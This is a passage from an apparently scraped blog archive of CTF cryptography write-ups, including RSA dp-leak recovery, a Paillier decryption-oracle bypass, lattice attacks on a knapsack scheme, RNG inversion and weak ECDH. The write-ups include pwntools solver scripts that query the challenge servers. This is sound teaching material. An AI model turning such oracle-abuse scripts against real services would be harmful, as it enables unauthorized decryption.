255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81] ans = [] for i in range(0, 154): random.seed(seeds[i]) rands = [] for j in range(0,4): rands.append(random.randint(0,255)) print(rands) ans.append(res[i] ^ rands[i%4]) print(ans) # print(bytes(ans)) ans = [53, 51, 55, 50, 48, 48, 55, 52, 50, 54, 49, 54, 49, 49, 57, 54, 49, 53, 52, 52, 48, 53, 54, 52, 48, 53, 48, 52, 49, 49, 48, 55, 51, 54, 54, 53, 57, 49, 57, 48, 49, 56, 51, 49, 57, 52, 48, 53, 50, 57, 54, 54, 55, 50, 51, 48, 55, 54, 48, 52, 49, 50, 54, 54, 54, 49, 48, 56, 57, 51, 49, 53, 56, 54, 55, 56, 48, 57, 50, 56, 52, 53, 52, 53, 48, 50, 51, 50, 53, 48, 56, 55, 57, 51, 50, 55, 57, 53, 56, 53, 49, 54, 51, 51, 48, 52, 57, 49, 56, 56, 48, 55, 54, 53, 54, 57, 52, 54, 49, 52, 55, 53, 55, 53, 50, 56, 48, 48, 54, 51, 50, 48, 56, 49, 54, 56, 56, 49, 54, 52, 53, 55, 51, 52, 54, 55, 53, 53, 50, 50, 55, 48, 53, 55] print(bytes(ans)) # 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 然后常规解泄露dp的rsa\ne = 65537 n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113 dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 import gmpy2 from Crypto.Util.number import * dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 e=0x10001 n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391 c=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151 for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)//i)+1)==0: p=((dp*e-1)//i)+1 q=n//(((dp*e-1)//i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi print(long_to_bytes(pow(c,d,n))) # flag{74281db3-c6f0-e59a-4da6-39b8c71250fe} guess # 这个题妥妥的被找到非预期了。。。。\nAnalysis and implement # 这个地方是非预期的核心这里会随机选取一个key附加上明文上\nKEY比较特别的是，其中每个元素要么在KEY[R]上，要么在KEY[R+1]上，这是该非预期的基础\nself._send(\u0026#34;Give me m0.\u0026#34;) plaintext1 = int(self._recv().decode()) self._send(\u0026#34;Give me m1.\u0026#34;) plaintext2 = int(self._recv().decode()) if ( plaintext1 \u0026lt;= 2 or plaintext2 \u0026lt;= 2 or len(bin(plaintext1)) != len(bin(plaintext2)) ): return R = 2 * random.randint(0, 39) I = random.randint(0, 1) cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R]) cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + 1]) self._send(\u0026#34;This is a ciphertext.\u0026#34;) self._send(str([cipher1, cipher2][I])) 然后我们可以输入一次密文来得到明文,但不能输入cipher1和cipher2\ncipher = int(self._recv().decode()) plaintext = str(dec(n, g, LAM, cipher)) if int(plaintext) == plaintext1 * plaintext2 * KEY[R] or int(plaintext) == plaintext1 * plaintext2 * KEY[R+1]: return self._send(\u0026#34;This is the corresponding plaintext.\u0026#34;) self._send(plaintext) 根据同态的原理可以构造payload绕过检测\n$C_0={C_1}^{m_1}=g^{m_1 * m_1 * m_2 * k}r^n \\;mod \\;n^2$\n解密后可以得到：\n$M\\div(m_1 * m_1 * m_2)=k$\n此时如果输入0如果报错则当前k对应的下标是0，否则下标为1\n又因为\nassert key[0] == 119 and key[1] == 241 and key[2] == 718 and key[3] == 647 由这个hint我们知道服务器上面的key是不变的\n只要重复访问服务器就能把key表oracle出来然后解得key到我们记录的表里面去找就好了\nsolution # import random import hashlib from math import gcd from pwn import * from icecream import * from MyRE import CatNum from itertools import product # from MyRE import * # from rich import * from rich.traceback import install install() # ----------------------------------- String = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz\u0026#34; # nc 47.104.85.225 57811 def pow1(): io.recvuntil(\u0026#39;?+\u0026#39;) s2 = io.recvuntil(\u0026#39;) \u0026#39;)[:-2] HASH = io.recvuntil(\u0026#39;\\n\u0026#39;)[3:-1] print(s2) print(HASH) for i in product(String,repeat=4): s1 = \u0026#39;\u0026#39;.join(i) # print(s1.encode())\\ s1 = s1.encode() s0 = s1+s2 # print(s0) HASH1 = hashlib.sha256(s0).hexdigest().encode() # print(HASH1) # input() if(HASH==HASH1): print(s1) io.sendline(s1) return def enc(n, g, m): while 1: r = random.randint(2, n - 1) if gcd(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c def init(): # pow1() # io.interactive() buf = io.recvuntil(\u0026#39;round\u0026#39;) round = io.recvuntil(\u0026#39;Step 1\u0026#39;) ic(round) io.recvuntil(\u0026#39;KeyGen. This is my public key.\u0026#39;) buf = io.recvuntil(\u0026#39;Step \u0026#39;) ans = CatNum(buf) n,g = int(ans[0]),int(ans[1]) ic(n) ic(g) return n,g # ===================================== key0={130, 899, 903, 521, 142, 783, 530, 148, 416, 288, 550, 939, 427, 299, 558, 942, 685, 307, 566, 313, 577, 585, 718, 983, 349, 355, 611, 995, 614, 746, 751, 114, 498, 885, 119, 637, 638, 639} key1={128, 129, 646, 647, 521, 780, 396, 526, 653, 400, 783, 530, 148, 918, 281, 158, 286, 416, 548, 550, 936, 810, 939, 427, 299, 558, 942, 944, 430, 307, 309, 566, 313, 186, 577, 201, 585, 461, 718, 333, 977, 727, 216, 983, 860, 355, 613, 614, 232, 745, 746, 877, 237, 241, 113, 114, 244, 885, 119, 888, 121, 123, 637, 638, 639} def get_index(k): if(k in key0): return \u0026#39;0\u0026#39; else: return \u0026#39;1\u0026#39; def oracle(n,g): io.recvuntil(\u0026#39;Please give me one decimal ciphertext.\\n\u0026#39;) c = enc(n,g,123321123321123321123321) io.sendline(str(c)) io.recvuntil(\u0026#39;Step 3\u0026#39;) io.recvline() # s3 m1 = 787 m2 = 929 io.recvuntil(\u0026#39;Give me m0.\\n\u0026#39;) io.sendline(str(m1)) io.recvuntil(\u0026#39;Give me m1.\\n\u0026#39;) io.sendline(str(m2)) io.recvuntil(\u0026#39;This is a ciphertext.\\n\u0026#39;) buf = io.recvline() ans = CatNum(buf) c1 = int(ans[0]) # print(buf,c1) # init x1 = enc(n,g,787) c1x1 = pow(c1,m1,n**2) # ic(c1x1) io.sendline(str(c1x1)) io.recvuntil(\u0026#39;This is the corresponding plaintext.\\n\u0026#39;) buf = io.recvline() # print(ans) ans = CatNum(buf) tmp = int(ans[0]) io.recvuntil(\u0026#39;-\u0026gt; c0 , m1 -\u0026gt; c1)?\\n\u0026#39;) k = (tmp)//(m1*m2*m1) ic(k) _01 = get_index(k) io.sendline(_01) res = io.recvline() print(res) # io.interactive() return res,k time=0 # nc 47.104.85.225 57811 io = remote(\u0026#39;47.104.85.225\u0026#39;,57811) pow1() for i in range(100): n,g = init() res,k = oracle(n,g) if(b\u0026#39;Sorry\u0026#39; in res): print(f\u0026#39;{k}:0\u0026#39;) key0.add(k) time=0 io.close() io = remote(\u0026#39;47.104.85.225\u0026#39;,57811) pow1() else: sleep(0.25) print(f\u0026#39;{k}:1\u0026#39;) key1.add(k) time+=1 if(time==32): print(\u0026#39;get it\u0026#39;) print(io.recv(2048)) exit() print(f\u0026#39;key0={key0}\u0026#39;) print(f\u0026#39;key1={key1}\u0026#39;) print(time) ic| round: b\u0026#39; 32 Step 1\u0026#39; ic| n: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922097 ic| g: 140359393736491083554637764633966036595869523810831521796100389946301014713501052438423015898275061604402441271059379191254720192715521217765512578594812234847906891823150303725078568490730815789232226736630007558775806211165296878777428640046549542601742670073385256102038588867770586061404269183834130922098 ic| k: 130 b\u0026#39;Good! You are right\\n\u0026#39; 130:1 get it b\u0026#39;flag{e87fdfb6-8007-4e1c-861f-5bde3c8badb3}\\n\u0026#39; [*] Closed connection to 47.104.85.225 port 57811 myRSA # 小数学题，利用各种姿势消去z对解密得影响\n核心点\ndef encry(message,key,p,q,e): k1,k2 = key[random.randint(0,127)],key[random.randint(0,127)] x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = k1 + k2 c = pow(b2l(message),e,p*q) return x * c + y * c + z # enc 首先\n$设t=p+q$\n$(enc-z)/c=(x+y)-4n=t^3-t^2+t$\n但由于 $f(t)=t^3-t^2+t-9999$ 的图像几乎是一条直线，我们推断，此时z对于解这个方程没有实质性的影响\n测试后发现确实可以消去第一次加密时z的影响\n解密时也可以用x+y消去z对flag的影响\nz//(x+y)=0\nfrom Crypto.Util.number import * from Crypto.Util.number import getPrime,bytes_to_long as b2l import libnum from gmpy2 import iroot from icecream import * import sympy as sp # 导入sympy包、 def getpq(n,e,enc,c): tmp = 400000 ic(tmp) ans = enc//c -tmp -4*n x = sp.Symbol(\u0026#39;x\u0026#39;) # 定义符号变量 f = x**3 - x**2 + x - ans # 定义要求解的一元三次方程 ans = sp.solve(f) # print(ans) t = int(ans[2].round()) ic(t) tmp = iroot(t*t-4*n,2) ic(tmp) if(tmp[1] == True): delta = tmp[0] p = (t+delta)//2 ans = t**3 - t**2 + t print(n%p) ic(p) return p # 一次交互后得到的数据 n = 66027874281672625418586014781126070908243950646389324074550248999679090401150270793389452270314828298481437497840416396018574761898600856029902467560028361877554457938912404358968210921272837218306889478597234820590780596868027285957738861052042217870708996313230729115851397741357365848182263953315379303203 e = 65537 message = b\u0026#39;1231231312312312313123\u0026#39; c = pow(b2l(message),e,n) enc = 2786282534107784071949674754303734020650420550514064517704448066809278965224884310691670432441397979710035489386642473027744366146283566077172758576117265010888225901430814453103910642061532363684990980080593171873048076522753507082554621333455105446034271978972878134597921516292423901550995709181303022297139396128082022193615685724911328311390083321186035987746342068856533118816750276771278003232809361817465525887406183533073435476911136829775173155132394236172457900926847903014330722145729653282601258124899631596559793043199596264295846181613188399943356771658381560774428425036945242894731920547142207496951001372212394788053725065262462489938796299464287972476543278196732420981982981923866883740677815684307375214870832207719694203331026829445710224285190480 flagenc = 78903156043541822956852921255839504785260043170754244208159263853595508405000661899479307588531494172830632220991906679919999441798497272603229277113581316208572288228086544225197245626229321664099299589135332933949675253738548931053641537046898654150676091285693057337873250759686984233682913388477992334871253653295943818266597281224943136933411417199795127815822097900855479634034406709830823051590719193303685067733559940313006125179805670789881285419162909762014157603424444680011222474284489067733520824336575376527926069324059697680207015464280592590151869974781941122398578485426146276184697907560587701585522746826606269636562989809117072089021357481402267496699431701068851120069674664273560247308363437176623358041554600504472302094490793591097239195676611890 # ========================= p =getpq(n,e,enc,c) q = n//p print(n==p*q) # k = k1+k2 x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = enc-(x+y)*c print(z) # print(z==k) flagc = (flagenc)//(x+y) ic(z//(x+y)) # q=n//p # print(q) # n=p*q phi=(p-1)*(q-1) d = libnum.invmod(e,phi) print(long_to_bytes(pow(flagc,d,n))) # bytes_to_long() # long_to_bytes() \u0026#39;\u0026#39;\u0026#39; return x * c + y * c + z \u0026#39;\u0026#39;\u0026#39; # flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} Challenge-attachment # attachment 和20年相比,诸神黄昏行为减少了，但是仍有迷惑操作，比如放题秒解,不解签到题去解高难题的操作\n","date":"23 August 2021","permalink":"/achieve/ctf/%E7%A5%A5%E4%BA%912021/","section":"archive","summary":"","title":"WriteUp for crypto in 翔云ber 2021"},{"content":"\rWriteUp for InCTF # gold_digger # def encrypt(msg, N,x): msg, ciphertexts = bin(bytes_to_long(msg))[2:], [] for i in msg: while True: r = random.randint(1, N) if gcd(r, N) == 1: bin_r = bin(r)[2:] c = (pow(x, int(bin_r + i, 2), N) * r ** 2) % N ciphertexts.append(c) break return ciphertexts The main problem\nc = (pow(x, int(bin_r + i, 2), N) * r ** 2) % N if $flag_i$ is 1 ,the bin_r + i well be odd\nelse the $r+i$ well be even\nwe can determine the flag by calculating Jacobi symbol of c to N\nsolution # from Crypto.Util.number import * import gmpy2 from data import ct N = 76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019 x = 72734035256658283650328188108558881627733900313945552572062845397682235996608686482192322284661734065398540319882182671287066089407681557887237904496283 plaintext = \u0026#39;\u0026#39; for line in ct: if gmpy2.jacobi(line,N) == -1: plaintext += \u0026#39;1\u0026#39; else: plaintext += \u0026#39;0\u0026#39; print(long_to_bytes(int(plaintext,2))) # inctf{n0w_I_4in7_73ll1ng_u_4_g0ldd1gg3r} Lost Baggag # In this challenge , we need to analyze a backpack encryption system\nthe challenge give us only pubkey and cipher\nso，i tried Lattice reduction algorithm to solve it\nsagemath lattice reduction code：\nimport pickle data = pickle.load(open(\u0026#39;enc.pickle\u0026#39;, \u0026#39;rb\u0026#39;)) cip = data[\u0026#39;cip\u0026#39;] pbkey = data[\u0026#39;pbkey\u0026#39;] print(len(pbkey)) S = cip M = pbkey n = len(M) L = matrix.zero(n + 1) for row, x in enumerate(M): L[row, row] = 2 L[row, -1] = x L[-1, :] = 1 L[-1, -1] = S f = open(\u0026#39;LLLdata.txt\u0026#39;,\u0026#39;a+\u0026#39;) res = L.LLL() for i in range(144): ans = list(res[i]) f.write(str(ans)+\u0026#39;\\n\u0026#39;) print(ans) The matrix is looks like: $$\\begin{pmatrix} 2\u0026amp;0\u0026amp;0\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_1\\\\ 0\u0026amp;2\u0026amp;0\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_2 \\\\ 0\u0026amp;0\u0026amp;2\u0026amp;\\cdots\u0026amp;0\u0026amp;PK_3 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\\\ 0\u0026amp;0\u0026amp;0\u0026amp;\\cdots\u0026amp; 2 \u0026amp; PK _ n \\\\ 1\u0026amp;1\u0026amp;1\u0026amp;\\cdots \u0026amp;1\u0026amp;ct \\end{pmatrix} $$\nLets check the LLLdata.txt\nfortunately,I find a vector only have 1 and -1\ntry to docode it and get the flag\nfrom Crypto.Util.number import * ans = [-1, 1, -1, -1, -1, -1, -1, 1, -1, -1, -1, -1, -1, -1, 1, 1, -1, -1, -1, 1, 1, -1, -1, 1, 1, 1, -1, 1, -1, -1, 1, 1, 1, -1, 1, 1, 1, -1, -1, 1, -1, -1, -1, -1, -1, 1, -1, 1, 1, 1, -1, 1, -1, -1, 1, 1, -1, 1, -1, -1, 1, -1, -1, 1, -1, -1, -1, -1, -1, 1, -1, 1, -1, 1, -1, 1, -1, -1, 1, 1, 1, -1, 1, 1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, -1, 1, -1, -1, 1, -1, -1, -1, -1, 1, 1, -1, -1, 1, 1, -1, -1, 1, 1, 1, -1, 1, -1, -1, -1, 1, -1, -1, 1, 1, 1, -1, -1, 1, 1, -1, -1, -1, 1, -1, -1, 1, -1, 1, 1, -1, 1, -1, -1, 1] flag = \u0026#39;\u0026#39; for i in ans: if(i == -1): flag+=\u0026#39;1\u0026#39; else: flag+=\u0026#39;0\u0026#39; msg = int(flag[::-1],2) print(long_to_bytes(msg)) flag = \u0026#39;\u0026#39; for i in ans: if(i == -1): flag+=\u0026#39;0\u0026#39; else: flag+=\u0026#39;1\u0026#39; msg = int(flag[::-1],2) print(long_to_bytes(msg)) # inctf{wr5_m4_b4g?} Right Now Generator # This challenge is easy after analysing\nIt’s more like a reverse than a crypto\u0026hellip;.\nanalysis and implement # Our major trouble is to find The Inverse function of functioncs below,\nAnd how we think about finding seed-sequence from a-sequence given by the attachment\ndef wrap(self, pr=True): hsze = self.sze//2 for i in range(self.sze): r1 = self.seed[i] r2 = self.seed[(i+hsze)%self.sze] self.seed[i] = ((r1^self.pad)*r2)%self.mod self.ctr = 0 def next(self): a, b, c, d = (self.seed[self.ctr^i] for i in range(4)) mod = self.mod k = 1 if self.ctr%2 else 2 a, b, c, d = (k*a-b)%mod, (b-c)%mod, (c-d)%mod, (d-a)%mod self.ctr += 1 if self.ctr==64: self.wrap(pr=False) return a With a simple algebraic calculation\nWe can write out Inverse function easily\nfrom a-sequence get seed-sequence:\ndef from_aa_get_seed(aa): seed=[] for i in range(0,63,4): tmp = aa[i:i+4] a1,a2,a3,a4 = tmp s0 = (a1+a2)%mod s1 = (2*a2+a1)%mod s2 = (a3+a4)%mod s3 = (2*a4+a3)%mod seed = seed + [s0,s1,s2,s3] return seed inv_wrap:\ndef inv_wrap(seed): for i in range(32): r2 = seed[i] r1 = ((seed[i+32]*libnum.invmod(r2,mod))%mod)^pad seed[i+32]=r1 for i in range(32): r2 = seed[i+32] r1 = ((seed[i]*libnum.invmod(r2,mod))%mod)^pad seed[i] = r1 return seed Combined them into decryption code\nSolution # import random, hashlib, os, gmpy2, pickle import libnum from libnum.modular import invmod from Crypto.Util.number import * from Crypto.Cipher import AES # ----------------------------------- pad = 0xDEADC0DE sze = 64 mod = 18446744073709551629 def inv_wrap(seed): for i in range(32): r2 = seed[i] r1 = ((seed[i+32]*libnum.invmod(r2,mod))%mod)^pad seed[i+32]=r1 for i in range(32): r2 = seed[i+32] r1 = ((seed[i]*libnum.invmod(r2,mod))%mod)^pad seed[i] = r1 return seed def from_aa_get_seed(aa): seed=[] for i in range(0,63,4): tmp = aa[i:i+4] a1,a2,a3,a4 = tmp s0 = (a1+a2)%mod s1 = (2*a2+a1)%mod s2 = (a3+a4)%mod s3 = (2*a4+a3)%mod seed = seed + [s0,s1,s2,s3] return seed def from_leak_get_aa(leak): aa =[] for i in range(0,1024,16): tmp =leak[i:i+16] s = bytes.fromhex(tmp) tmp = bytes_to_long(s) aa.append(tmp) return aa def next(seed1,i): ctr = i a, b, c, d = (seed1[ctr^i] for i in range(4)) mod = 18446744073709551629 k = 1 if ctr%2 else 2 # 1 和 2 交替出现,可控 a, b, c, d = (k*a-b)%mod, (b-c)%mod, (c-d)%mod, (d-a)%mod return a enc = {\u0026#39;cip\u0026#39;: \u0026#39;71d39d37d3c03e08b82d81ae3b4be658e2dbdaee6a73d73a3e88271f423db30f0422d4fb9475ceef281a746afa86eaee\u0026#39;, \u0026#39;iv\u0026#39;: \u0026#39;cbf411655acfd7f670968ccf44d74e05\u0026#39;, \u0026#39;leak\u0026#39;: \u0026#39;3aeba43302ab9ad0df898103fc0223be23f5ec10f62ad48744c2ec06bc4ac9b2290aff5f5d17fc2ff2a1115e657ddced0f12238ca12b076bf85fed0ce621202d159c014907e39ba7373ada78a4dea3a76bfb9ff09a8f10705cd95a47edd743fde25f32ab545bf98bba1344bed511b0c095ddede11b4a35bc02acb34d3aef46c56bfc9b668c82c0d3da76307dd87016e1a7df478cdefb98d4fe991088f478f24390fac3d4f0d0673d2801f37df421ab17cb72af64a8b21ebf9d73c3ef35a8bd5fe98c62a910ef8b859b86a58bf670fe544266bc37a36d3828e7397bac0b817f41522e76a68661b3e9952ed3d2eb7846b2f9cd2c1cc44eda2ac536eb826ce922afaa4c7d61ff3db9023cf2fff8fb34791954fbb1541f043fe26e92fb79f119fbe175bd1b551dd1225275a457580bef4301505f474060f39caad6d3172f17a9a21f68e66b59a13e817b0201dbdbcc1e6c1d80ab2e8d38f7f0a62d0bb3577da845643273b1743f5aac064422bdbd85358f6da726f9114c5553432d4f4e2f43f997975add7ea3b6a56b689ff84f7635815879e28d8c7421b979449f5bccb29cce745862610af8c99379c60e1205d5e1eda9d2f5243d4da4325ac142bd196d1777bd2d4f61eb355b7fca3e16295d05e8a21e75f010272ce159afb49fa3d4b97bd242304e34599f7bc8edf5b4430bb42b12437b7c27583d303043311afd56fae70a7d6b\u0026#39;} leak = enc[\u0026#39;leak\u0026#39;] aa = from_leak_get_aa(leak) seed = from_aa_get_seed(aa) seed_prev = inv_wrap(seed) out1 = \u0026#39;\u0026#39;.join([format(next(seed_prev,i), \u0026#39;016x\u0026#39;) for i in range(64)]) key = bytes.fromhex(out1) key = hashlib.sha256(key).digest()[:16] cip = enc[\u0026#39;cip\u0026#39;] iv = enc[\u0026#39;iv\u0026#39;] cip = bytes.fromhex(cip) iv = bytes.fromhex(iv) aes = AES.new(key, AES.MODE_CBC, iv) flag = aes.decrypt(cip) print(flag) # b\u0026#39;inctf{S1mpl3_RN65_r_7h3_b35t!_b35e496b4d570c16}\\x01\u0026#39; Eazy Xchange # there we can exchange gen_key into a simple form\ndef gen_key(G, pvkey): G = sum([i*G for i in pvkey]) return G def gen_key(G, pvkey): tmp = sum([i for i in pvkey]) return G*tmp and the tmp is small $(tmp \u0026lt;1024)$\nand there tell us $B=tmp*G$\ndef gen_bob_key(EC, G): bkey = os.urandom(4) B = gen_key(G, bkey) return B, bkey so\n$SS=tmp_1*tmp_2 * G$\nand $SS=tmp_1*tmp_2\u0026lt;1024 * 1024$\nWe can try out $tmp_1*tmp_2$ easily\nimport os, hashlib, pickle from tqdm import tqdm # ----------------------------------- from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad p = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF a = p - 3 b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B EC = EllipticCurve(GF(p), [a, b]) G = EC.gens()[0] # 固定的点 def decrypt(cip, key,iv): key = hashlib.sha256(str(key).encode()).digest()[:16] cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.decrypt(cip) data = {\u0026#39;cip\u0026#39;: \u0026#39;9dcc2c462c7cd13d7e37898620c6cdf12c4d7b2f36673f55c0642e1e2128793676d985970f0b5024721afaaf02f2f045\u0026#39;, \u0026#39;iv\u0026#39;: \u0026#39;cbd6c57eac650a687a7c938d90e382aa\u0026#39;, \u0026#39;G\u0026#39;: \u0026#39;(38764697308493389993546589472262590866107682806682771450105924429005322578970 : 112597290425349970187225006888153254041358622497584092630146848080355182942680 : 1)\u0026#39;} FLAG = data[\u0026#39;cip\u0026#39;] iv = data[\u0026#39;iv\u0026#39;] FLAG = bytes.fromhex(FLAG) iv = bytes.fromhex(iv) x = 38764697308493389993546589472262590866107682806682771450105924429005322578970 y = 112597290425349970187225006888153254041358622497584092630146848080355182942680 G = EC(x,y) print(G) SS = G for i in tqdm(range(2,1024*1024)): SS = SS+G msg = decrypt(FLAG, SS.xy()[0],iv) if(b\u0026#39;inctf\u0026#39; in msg): print(msg) break # inctf{w0w_DH_15_5o_c00l!_3c9cdad74c27d1fc} Encrypted Operations # 这个太哈人了 全是cpp（我tm直接吓出母语）😫😫😫\n审了一天\n发现印度老哥这个vector的理解和我不一样，缝缝补补终于搞出来了\n反正这个题应该很难有复现环境了\n(其实能把homomorphic_system复写一遍应该还是可以的？放在docker里面还是比较好部署的)\n就干脆简单说一下三个部分的思路好了🐫\nprat1\nfor (int x = 0; x \u0026lt; 20; x++) { for (int y = 0; y \u0026lt; 20; y++) { m[x][y] = ++val; } } int d = 20; int r = 3; int c = 3; for (int i = 0; i \u0026lt; 18; i++) { for (int j = 0; j \u0026lt; 18; j++) { for (int p = 0; p \u0026lt; 3; p++) { for (int q = 0; q \u0026lt; 3; q++) { mat.push_back(m[i + p][j + q]); } } } } for (int j = 0; j \u0026lt; int(mat.size()); j += 9) { v.push_back(slice(mat, j, j + 9));//切片矩阵化 } idx = Genrand(0, v.size() - 1); vector\u0026lt;int64_t\u0026gt; temp1(begin(v[idx]), end(v[idx])); vector\u0026lt;int64_t\u0026gt; mvector = temp1; sum1 = accumulate(mvector.begin(), mvector.end(), 0);//随机先去一个切片求和 FheEncrypt(mvector); EncryptedOperations(); vector\u0026lt;int64_t\u0026gt; p = FheDecrypt(); if (sum1 == 0) { cout \u0026lt;\u0026lt; \u0026#34;\\n\\nCHALLENGE CORRUPTED!!!!\u0026#34;; exit(0); } if (p[0] == sum1) cout \u0026lt;\u0026lt; \u0026#34;\\n\\nYou got all the encrypted operations right! Great!!\\n\\nNow on to the next\\n\\n\u0026#34;; else exit(0); 拿导外面跑一下发现其实就是对切片求和，由于temp1里面本质上是个等差数列，找一下规律就可以了\npart2同理\npayload1\n9 0 0 0 * 1 y 189 0 0 0 + 1 n 189 0 0 0 + 1 n + 20 0 0 0 * 1 y 830 0 0 0 + 1 n level2 对 p1 p2 取反使其抵消掉numVec里面除了m1[row[2]]以外的所有向量\n在 userinp生成处，往后多选了一位，这个操作可以在EncryptedOperations中对m1[row[2]]右移一位抵消掉影响，最有一位并不会消失，而是会将vector的长度扩展一位\np = vector\u0026lt;int64_t\u0026gt;(p.begin(), p.begin() + 5 + 1); exp\nfrom pwn import * from pwnlib.util.iters import random_permutation # crypto.challenge.bi0s.in 1221 data = \u0026#34;\u0026#34;\u0026#34;9 0 0 0 * 1 y 189 0 0 0 + 1 n 189 0 0 0 + 1 n + 20 0 0 0 * 1 y 830 0 0 0 + 1 n 0 0 0 0 0 \u0026gt; 1 n -1 -1 -1 -1 -1 * 1 n -1 -1 -1 -1 -1 * 1 n \u0026#34;\u0026#34;\u0026#34; io = remote(\u0026#39;crypto.challenge.bi0s.in\u0026#39;,1221) io.sendline(data) io.recvuntil(\u0026#39;flag\u0026#39;) io.recvuntil(\u0026#39;flag\u0026#39;) buf = io.recv(2048) if(b\u0026#39;inctf\u0026#39; in buf): print(buf) exit(0) # inctfi{m4st3r_0f_Encrypt3d_0p3r4t1on5_B3c0m3_u_H4v3!!} shell\n❯❯ inctf 22:18 python3 -u \u0026#34;c:\\Users\\16953\\Desktop\\inctf\\Encrypted Operations\\src\\exp.py\u0026#34; [x] Opening connection to crypto.challenge.bi0s.in on port 1221 [x] Opening connection to crypto.challenge.bi0s.in on port 1221: Trying 34.106.211.122 [+] Opening connection to crypto.challenge.bi0s.in on port 1221: Done b\u0026#39;: inctfi{m4st3r_0f_Encrypt3d_0p3r4t1on5_B3c0m3_u_H4v3!!}\\n\\n\\nThankyou for using the srvice! Sucessfully performed all operatoions!!\\n\\n\\nExiting!!\u0026#39; [*] Closed connection to crypto.challenge.bi0s.in port 1221 Challenge-attachment # Attachment ","date":"15 August 2021","permalink":"/achieve/ctf/inctf2021/","section":"archive","summary":"","title":"WriteUp for crypto in InCTF2021"},{"content":"[toc]\ngkctf2021 6-25 补档 # XOR # from Crypto.Util.number import * from hashlib import md5 a = getPrime(512) b = getPrime(512) c = getPrime(512) d = getPrime(512) d1 = int(bin(d)[2:][::-1] , 2) n1 = a*b x1 = a^b n2 = c*d x2 = c^d1 flag = md5(str(a+b+c+d).encode()).hexdigest() print(\u0026#34;n1 =\u0026#34;,n1) print(\u0026#34;x1 =\u0026#34;,x1) print(\u0026#34;n2 =\u0026#34;,n2) print(\u0026#34;x2 =\u0026#34;,x2) 这个题基本是靠约束条件对多余情况进行剪枝，捡到运算量在合理范围就可以了\n顺序不变时只需要考虑低位，除开异或条件外还计 算 $a*b =n;mod;2^{i}-1$ 来对已猜测数据进行低位检测\n这是一种模糊的条件，该条件是最终条件的必要条件\n顺序改变的情况，异或需要考虑高低位交换的情况，每次要四个bit同时运算看是否同时满足 n的高位和低位\n乘法条件中，低位由于没有进位，直接判断$a*b =n;mod;2^{i}-1$\n高位由于又进位，使用高位相同时的必要条件if n_highbits-temp2 \u0026gt;= 0 and n_highbits-temp2 \u0026lt;=((2\u0026lt;\u0026lt;i+1)-1): a = 111\nb = 100\na*a = 1 1000 1\nb*b = 010000\n当然，这依旧是一个十分粗略的必要条件。。。。\n正序exp\n# 初始化第1位的已知数：0 def getab(n,x,lenth): a_list=[0] b_list=[0] # 这里判断512位应该就够了阿。。。。 mask = 0 for i in range(lenth): # 取第n位 mask = 2**(i+1)-1 xi = (x\u0026gt;\u0026gt;i) \u0026amp; 1 nextA_list=[] nextB_list=[] for ai in range(2): for bi in range(2): for j in range(len(a_list)): if (ai^bi == xi): nlow = n \u0026amp; mask axbLow = (((ai\u0026lt;\u0026lt;i)+a_list[j])*((bi\u0026lt;\u0026lt;i)+b_list[j]))\u0026amp;mask if(nlow==axbLow): nextA_list.append((ai\u0026lt;\u0026lt;i)+a_list[j]) nextB_list.append((bi\u0026lt;\u0026lt;i)+b_list[j]) # a_list = nextA_list b_list = nextB_list for a in a_list: if(n%a==0): return(a,n//a) lenth = 512 n = 